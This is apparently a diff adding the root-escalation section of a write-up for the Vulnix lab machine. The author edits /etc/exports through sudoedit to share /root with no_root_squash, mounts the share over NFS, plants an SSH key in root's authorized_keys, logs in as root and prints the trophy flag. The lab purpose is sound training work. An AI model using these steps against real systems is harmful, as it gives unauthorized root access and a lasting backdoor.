@@ -315,3 +315,87 @@ uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
 ```
 
 ## Shell as root
+
+Checking the `sudo -l` we can sudoedit the `/etc/exports` file:
+
+```
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+```
+
+`/etc/exports` is the configuration file for the NFS server. The syntax of the file is this:
+
+```
+Directory      hostname(options)
+```
+
+So let's simply export the `/root` directory:
+
+```
+/root           *(rw,no_root_squash)
+```
+
+```
+* = all hosts
+rw = read/write access
+no_root_squash = Maps remote root user to the local root user
+```
+
+Save it and reboot the server. (Kinda unrealistic) Now we can see that `/root` is on shared directories.
+
+```
+$ showmount -e 192.168.1.21                                                                                                                                                      
+Export list for 192.168.1.21:
+/root        *
+/home/vulnix *
+```
+
+Let's mount it:
+
+```
+$ mount -t nfs 192.168.1.21:/root exp       
+$ cd exp
+$ ls -la
+total 28
+drwx------ 3 nobody 4294967294 4096 Sep  2  2012 .
+drwxr-xr-x 4 root   root       4096 Nov 29 14:57 ..
+-rw------- 1 nobody 4294967294    0 Sep  2  2012 .bash_history
+-rw-r--r-- 1 nobody 4294967294 3106 Apr 19  2012 .bashrc
+drwx------ 2 nobody 4294967294 4096 Sep  2  2012 .cache
+-rw-r--r-- 1 nobody 4294967294  140 Apr 19  2012 .profile
+-r-------- 1 nobody 4294967294   33 Sep  2  2012 trophy.txt
+-rw------- 1 nobody 4294967294  710 Sep  2  2012 .viminfo
+```
+
+We can simply setup another one public key authentication now.
+
+```
+$ mkdir .ssh
+$ cd .ssh
+$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7PjCWVlzq4mOXSnDWMtDX4OS/lsLWRgASMdqnEAeB4RWrv4ek3/HhViSDCeFwr7h8b6SyBzSMi1mMVgS+INAZY0CilZVLSax4rNlg317AYz5zBHu3AM35hf1oPf/1EssCyqjOSHK+qOe0VH4/7nltS4jfL/Wgx9WmMaNHURjeD/aPmksFqFckxmPdMdoRRaB1y1Wju6qv52zKebz0Xjo7ClL7bnpbly7ulQeL0DYJAIDEVVKKHaGF6WiGd1Vblyk96a0eULdTKfoITLAlESnveMBE6IOBl1C/G1fN6lU3R03Soo4/bu71kr+lfdjHAERPM7eq8JlfO+e4/3Szo/1EVtd1sRL8Kr58oxR8eyJVQeC7kUncbrH49A13tCNJpZHefIKyfCXyAhTR8PV1yB7xUHlA4T1njmr59MCZbSMm2czze0Zmnl3qURrHy40sb/XzyGLDXqu26oPAMJwfipfpJTY5xZMgMD2iV4SOsOJNf4lIfzPXb64eX7+HO4jW/c8= root@0xatomlab > authorized_keys
+```
+
+```
+$ ssh -i id_rsa root@192.168.1.21 
+
+root@vulnix:~# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Reading the flag(s)
+
+```
+root@vulnix:~# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+```
+
+## Thank You
+
+Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"} :blush:
+
+Until next time keep pwning hard! :fire:
